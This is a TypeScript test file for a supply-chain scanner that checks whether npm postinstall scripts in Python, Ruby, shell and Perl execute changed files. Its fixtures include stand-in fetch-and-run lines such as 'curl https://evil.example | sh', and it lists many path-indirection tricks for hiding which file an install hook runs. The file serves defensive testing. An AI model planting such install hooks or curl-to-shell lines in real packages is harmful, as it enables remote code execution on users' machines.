import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const rb = "system('curl evil|sh')\n";
const pl = "system('curl evil|sh');\n";
const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const plE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "perl install.pl" }),
  "install.pl": body,
  [f]: "true\n",
  "README.md": "a\n",
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

// A run widens unless every argument is a plain literal or a simple tail.
// readmeQuiet is true only for those two shapes.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["J1 py pathlib / operator", pyE("from pathlib import Path\nimport subprocess\nn='run.sh'\nsubprocess.run(['sh', str(Path('docs') / n)])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J2 py glob literal pattern", pyE("import glob,subprocess\nsubprocess.run(['sh', glob.glob('docs/*.sh')[0]])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J3 py '/'.join list", pyE("import subprocess\nn='run.sh'\nsubprocess.run(['sh', '/'.join(['docs', n])])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J4 py path read from file", pyE("import subprocess\np=open('list.txt').read().strip()\nsubprocess.run(['sh', p])\n", "docs/run.sh", { "list.txt": "docs/run.sh\n" }), "docs/run.sh", sh, false],
  ["J5 py += build", pyE("import subprocess\np='docs/'\np+='run.sh'\nsubprocess.run(['sh', p])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J6 py chdir + listdir", pyE("import os,subprocess\nos.chdir('docs')\nfor f in os.listdir('.'):\n    subprocess.run(['sh', f])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J7 py __add__", pyE("import subprocess\nn='run.sh'\nsubprocess.run(['sh', 'docs/'.__add__(n)])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J8 rb Dir glob", rbE("load Dir['docs/*.rb'].first\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["J9 rb array join", rbE("n='run.rb'\nload ['docs', n].join('/')\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["J10 rb << append", rbE("p='docs/'.dup\np << 'run.rb'\nload p\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["J11 sh source glob", shE(". docs/*.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J12 sh cat pipe sh", shE("cat docs/run.sh | sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["J13 sh stdin redirect", shE("sh < docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, true],
  // A cd word widens the file: the relative path is not resolved after the cd.
  ["J14 sh cd then relative", shE("cd docs && sh run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J15 sh find -exec", shE("find docs -name '*.sh' -exec sh {} \\;\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["J16 perl dot concat", plE("my $n = 'run';\ndo 'docs/' . $n . '.pl';\n", "docs/run.pl"), "docs/run.pl", pl, true],
  ["J18 py literal docs path", pyE("import subprocess\nsubprocess.run(['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["J17 perl literal do", plE("do 'docs/run.pl';\n", "docs/run.pl"), "docs/run.pl", pl, true],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
